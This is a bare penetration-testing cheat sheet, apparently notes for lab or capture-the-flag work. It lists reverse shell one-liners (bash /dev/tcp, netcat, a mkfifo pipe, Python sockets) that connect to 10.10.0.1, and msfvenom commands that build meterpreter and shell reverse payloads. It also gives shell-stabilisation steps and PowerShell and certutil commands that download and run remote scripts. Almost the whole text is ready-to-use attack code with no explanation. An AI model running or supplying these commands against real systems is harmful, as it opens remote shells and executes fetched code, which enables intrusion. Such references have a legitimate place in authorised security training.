sudo python3 -m http.server 80
## Linux reverse shell

<a href="https://weibell.github.io/reverse-shell-generator/">Something</a>
```bash
https://weibell.github.io/reverse-shell-generator/
bash -i >& /dev/tcp/10.10.0.1/777 0>&1
nc -e /bin/bash 10.10.0.1 777
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.1 777 \>/tmp/f
python \-c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.10.0.1",777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=777 -f exe > reverse.exe
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.1 LPORT=777 -f exe > reverse.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=777 -f elf >reverse.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.0.1 LPORT=777 -f elf >reverse.elf

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
```
## Interactive shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
perl -e 'exec "/bin/bash";'
/bin/sh -i

perl: exec "/bin/bash";
ruby: exec "/bin/bash"
lua: os.execute('/bin/bash')

CTRL-Z
stty raw -echo
fg

export TERM=xterm

rlwrap nc -vlnp 1234
```
## Download files
```powershell
certutil.exe -urlcache -split -f http:// .exe
iwr http:// -outfile .exe
powershell.exe IEX (New-Object Net.WebClient).DownloadFile("")
```
## Download and run powershell script
```powershell
powershell.exe IEX (New-Object Net.WebClient).DownloadString("")
powershell.exe -e https://raikia.com/tool-powershell-encoder
```
## Powershell.exe Bit
```powershell
[Environment]::Is64BitProcess

C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe (32bit)
C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe (32bit -> 64bit)
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (64bit)
```
